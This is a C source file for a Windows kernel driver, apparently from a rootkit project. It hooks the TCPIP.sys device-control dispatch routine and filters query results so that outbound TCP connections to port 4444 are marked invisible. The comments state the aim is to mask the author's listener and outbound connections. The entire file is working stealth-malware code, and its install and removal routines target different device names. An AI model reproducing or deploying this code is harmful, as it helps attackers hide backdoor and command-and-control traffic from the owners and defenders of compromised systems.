#include "tcphook.h"


// Install a hook in the TCPIP.sys driver
// Intended to mask our listener/outbound connections 
NTSTATUS TCPHook() {

	// TCPIP.sys unicode string identifier 
	UNICODE_STRING  usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Tcpip");

	// Declare variables
	PFILE_OBJECT PFILE_TCP = NULL;
	PDEVICE_OBJECT PDEVICE_TCP = NULL;
	PDRIVER_OBJECT PDRIVER_TCP = NULL;
	
	// Retrieve device pointer to TCPIP.sys
	NTSTATUS status = IoGetDeviceObjectPointer(&usDeviceName, FILE_READ_DATA, &PFILE_TCP, &PDEVICE_TCP);

	// Check to ensure retrieving the pointer was successful
	if (!NT_SUCCESS(status)) {
		return status;
	}

	// Once we have a device pointer, retrieve the driver object
	PDRIVER_TCP = PDEVICE_TCP->DriverObject;

	// Save a reference to the old IRP handler for later
	OldIrpMjDeviceControl = PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	// Replace the IRP_MJ_DEVICE_CONTROL function pointer with our own
	InterlockedExchange((PLONG)&PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG) TCPIRPHookHandler);

	// Decrements the file object reference count, should be one and deleted
	if (PFILE_TCP != NULL) {
		ObDereferenceObject(PFILE_TCP);
	}
	PFILE_TCP = NULL;

	return STATUS_SUCCESS;
}

NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufferLength, outBufferLength, requestcode;
	TDIObjectID			*inBuf;

	// Recieve the IRP stack location from system
	irpSp = IoGetCurrentIrpStackLocation(Irp);

	// Recieve the buffer lengths, and request code
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	// Check the request code
	switch (requestcode) {

		// IOCTL_TCP_QUERY_INFORMATION_EX is discussed in hook.h
		case IOCTL_TCP_QUERY_INFORMATION_EX:
		{
		
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", requestcode));

			/*
			The IOCTL_TCP_QUERY_INFORMATION_EX IOCTL indicated that the transfer type is 003:
			https://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx

			MSDN defines the following transfer types:

			#define METHOD_BUFFERED                 0
			#define METHOD_IN_DIRECT                1
			#define METHOD_OUT_DIRECT               2
			#define METHOD_NEITHER                  3

			METHOD_NEITHER

			https://msdn.microsoft.com/en-us/library/windows/hardware/ff540663(v=vs.85).aspx

			The I/O manager does not provide any system buffers or MDLs. The IRP supplies the user-mode virtual 
			addresses of the input and output buffers that were specified to DeviceIoControl or IoBuildDeviceIoControlRequest,
			without validating or mapping them. The input buffer's address is supplied by Parameters.DeviceIoControl.Type3InputBuffer
			in the driver's IO_STACK_LOCATION structure, and the output buffer's address is specified by Irp->UserBuffer.
			Buffer sizes are supplied by Parameters.DeviceIoControl.InputBufferLength and Parameters.DeviceIoControl.OutputBufferLength
			in the driver's IO_STACK_LOCATION structure.		
			*/

			inBuf = (TDIObjectID *)(irpSp->Parameters.DeviceIoControl.Type3InputBuffer);

			// CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP, only filtering TCP connections
			if (inBuf->toi_entity.tei_entity == CO_TL_ENTITY)
			{
				// Ensure the toi_id is one of the supported values we've defined structures for
				if ((inBuf->toi_id == 0x101) || (inBuf->toi_id == 0x102) || (inBuf->toi_id == 0x110))
				{
					// Call our completion routine if IRP successful
					irpSp->Control = 0;
					irpSp->Control |= SL_INVOKE_ON_SUCCESS;

					// Save old completion routine if present
					irpSp->Context = ExAllocatePool(NonPagedPool, sizeof(REQINFO));

					((PREQINFO)irpSp->Context)->OldCompletion = irpSp->CompletionRoutine;
					((PREQINFO)irpSp->Context)->ReqType = inBuf->toi_id;

					// Setup our function to be called on completion of IRP
					// we will filter the response in the completion routine
					irpSp->CompletionRoutine = (PIO_COMPLETION_ROUTINE)HookCompletionRoutine;
				}
			}

			break;
		}
		default:
		{
			// IRP passthrough
			break;
		}
	}

	// Now return the I/O request to the old proper handler
	return OldIrpMjDeviceControl(DeviceObject, Irp);

}

NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context) {

	PVOID OutputBuffer;
	ULONG NumOutputBuffers;
	PIO_COMPLETION_ROUTINE p_compRoutine;
	ULONG i;

	// Connection status values:
	// 0 = Invisible
	// 1 = CLOSED
	// 2 = LISTENING
	// 3 = SYN_SENT
	// 4 = SYN_RECEIVED
	// 5 = ESTABLISHED
	// 6 = FIN_WAIT_1
	// 7 = FIN_WAIT_2
	// 8 = CLOSE_WAIT
	// 9 = CLOSING
	// ...

	// Grab the results from the buffer
	OutputBuffer = Irp->UserBuffer;

	// Grab the old completion routine from the context pool
	p_compRoutine = ((PREQINFO)Context)->OldCompletion;

	// Initialize the number of results
	NumOutputBuffers = Irp->IoStatus.Information;

	// Depending on the Request type (which affects structure size) determine the number of output results
	if (((PREQINFO)Context)->ReqType == 0x101) { NumOutputBuffers /= sizeof(CONNINFO101); }
	else if (((PREQINFO)Context)->ReqType == 0x102) { NumOutputBuffers /=  sizeof(CONNINFO102); }
	else if (((PREQINFO)Context)->ReqType == 0x110) { NumOutputBuffers /=  sizeof(CONNINFO110); }
	
	// Loop over the output buffers, if any of the connections match our condition
	// set the status to 0 "Invisible" so it doesn't show up in results
	for (i = 0; i < NumOutputBuffers; i++)
	{
		// Hide all established outbound TCP connections calling back to 4444
		if (HTONS(((PCONNINFO101)OutputBuffer)[i].dst_port) == 4444) {
			((PCONNINFO101)OutputBuffer)[i].status = 0;
		}
	}

	// Free the context pool we created in TCPIRPHookHandler
	// which contained the old completion routine
	ExFreePool(Context);

	// If we're not the end of the chain call the old completion routine
	if ((Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL))
	{
		return (p_compRoutine)(DeviceObject, Irp, NULL);
	}
	else // otherwise return the status
	{
		return Irp->IoStatus.Status;
	}
}


NTSTATUS RemoveTCPHook(IN PDRIVER_OBJECT DriverObject) {

	UNREFERENCED_PARAMETER(DriverObject);

	// TCPIP.sys unicode string identifier 
	UNICODE_STRING  usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Tcp");

	// Declare variables
	PFILE_OBJECT PFILE_TCP = NULL;
	PDEVICE_OBJECT PDEVICE_TCP = NULL;
	PDRIVER_OBJECT PDRIVER_TCP = NULL;

	// Retrieve device pointer to TCPIP.sys
	NTSTATUS status = IoGetDeviceObjectPointer(&usDeviceName, FILE_READ_DATA, &PFILE_TCP, &PDEVICE_TCP);

	// Check to ensure retrieving the pointer was successful
	if (!NT_SUCCESS(status)) {
		return status;
	}

	// Once we have a device pointer, retrieve the driver object
	PDRIVER_TCP = PDEVICE_TCP->DriverObject;

	// Replace our hook function with the old proper one
	if (OldIrpMjDeviceControl) {
		InterlockedExchange((PLONG)&PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)OldIrpMjDeviceControl);
	}

	// Decrements the file object reference count, should be one and deleted
	if (PFILE_TCP != NULL) {
		ObDereferenceObject(PFILE_TCP);
	}
	PFILE_TCP = NULL;

	return STATUS_SUCCESS;
}